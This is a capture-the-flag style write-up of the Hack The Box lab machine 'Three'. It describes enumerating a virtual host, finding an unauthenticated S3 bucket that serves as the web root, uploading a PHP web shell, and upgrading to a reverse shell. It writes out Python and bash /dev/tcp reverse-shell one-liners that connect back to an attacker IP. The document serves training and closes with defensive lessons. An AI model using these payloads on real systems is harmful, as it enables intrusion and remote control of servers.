Yooo guys, it's ju4dy the landlord again.

# Three — Hack The Box Starting Point

|  |  |
| --- | --- |
| **Platform** | Hack The Box — Starting Point |
| **Tier** | 1 |
| **Difficulty** | Very easy |
| **Operating system** | Linux |
| **Target IP** | `10.129.227.248` |
| **Skills** | Virtual host enumeration, S3-compatible object storage, web shell upload, reverse shell |

## Overview

Three runs a small PHP site, *The Toppers*, on Apache. A virtual host scan reveals a second name,
`s3.thetoppers.htb`, which turns out to be an S3-compatible endpoint. It accepts any credentials, which is
already bad, but the real problem is the bucket behind it: the objects in that bucket *are* the web root of
the main site.

Because we can write to the bucket, we can write a PHP file into the web root and ask the application to
execute it. The upload is the remote code execution; everything after that is just upgrading a one-shot web
shell into an interactive reverse shell.

## Enumeration

```bash
nmap -sVC 10.129.227.248
```

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-14 12:27 +0100
Nmap scan report for 10.129.227.248
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Toppers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only SSH and a web server are exposed, so the application is the only realistic way in. Browsing
`http://thetoppers.htb/` shows a static-looking page for a band, with no obvious parameters or forms.

### Virtual host enumeration

The site is served by name, so directory brute forcing on the IP is less useful than looking for additional
virtual hosts. `gobuster` in `vhost` mode prepends each word to the domain and compares the responses:

```bash
gobuster vhost -u http://thetoppers.htb -w /home/jundy/Scripts/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

```text
s3.thetoppers.htb Status: 404 [Size: 21]
```

A `404` here is not a dead end. The main site answers `200`, so a name that resolves to a *different*
application — one that returns its own short error page — is exactly what a hidden virtual host looks like.
The hostname is added to the local hosts file:

```bash
echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

### Enumerating the bucket

`s3.thetoppers.htb` is an S3-compatible API. The AWS CLI is configured with placeholder credentials —
`test`/`test` — because this endpoint performs no real authentication:

```bash
aws configure
```

```text
AWS Access Key ID [****************test]: test
AWS Secret Access Key [****************test]: test
Default region name [e]:
Default output format [eu-east-1]:
```

Any non-empty pair is accepted; the keys are not checked against an account. Listing buckets through the
custom endpoint returns one:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

```text
2026-10-14 12:24:40 thetoppers.htb
```

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

```text
                           PRE images/
2026-10-14 12:24:40          0 .htaccess
2026-10-14 12:24:41      11952 index.php
```

The bucket is named after the site and contains `index.php`, `.htaccess` and an `images/` prefix. That is the
application's document root, served both by Apache and by the storage API. The bucket is world-writable, so
anything placed in it lands inside the web root.

## Exploitation — upload instead of upload form

A minimal PHP web shell is written locally and copied into the bucket:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
```

```text
upload: ./shell.php to s3://thetoppers.htb/shell.php
```

Requesting the object through the main virtual host executes it, and the `cmd` parameter is passed to the
shell:

```text
http://thetoppers.htb/shell.php?cmd=id
```

<!-- screenshot: command output from shell.php through thetoppers.htb -->

Command execution as the web server user is confirmed. The shell is enough for reading files but awkward for
anything interactive, so the next step is a reverse shell.

## Upgrading to a reverse shell

A listener is started on the attack host:

```bash
nc -nvlp 4444
```

Two payloads work on this host. The first uses Python 3 and a raw socket; `--data-urlencode` takes care of
escaping the quotes and semicolons in the request:

```bash
curl -G "http://thetoppers.htb/shell.php" --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.17.166\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
```

The second relies on Bash's `/dev/tcp` pseudo-device:

```bash
curl -G "http://thetoppers.htb/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.17.166/4444 0>&1'"
```

Either request produces a shell back on the listener, running as `www-data`.

<!-- screenshot: reverse shell session as www-data -->

## Finishing the box

The shell as `www-data` was enough to finish the box: the flag was read from the web root through the same
`cmd` parameter, submitted, and the machine closed out. There is no separate escalation step here — the
interesting half of Three is getting a file of our own into the bucket and having Apache treat it as code.

<!-- screenshot: flag read through the web shell -->

## Key takeaways

- **A storage bucket should never be the document root.** Separating object storage from the web server, or
  serving uploads from a domain that cannot execute code, removes the upload-to-RCE path entirely.
- **An S3 endpoint that accepts any key is unauthenticated storage.** Enable authentication on the service and
  restrict write access to the bucket; the `test`/`test` pair should have been rejected.
- **Virtual host fuzzing is worth the five thousand requests.** Directory brute forcing would never have found
  `s3.thetoppers.htb`; reading the `404` as a distinct application was the whole box.
- **Uploads need an allow-list and a non-executable destination.** Only the file types the application needs,
  stored outside the document root, with execution disabled in that directory.
- **A web shell is a foothold, not a shell.** Expect to upgrade to a reverse shell for anything interactive,
  and remember that a `cmd` parameter in a URL is trivially logged by every proxy on the path.
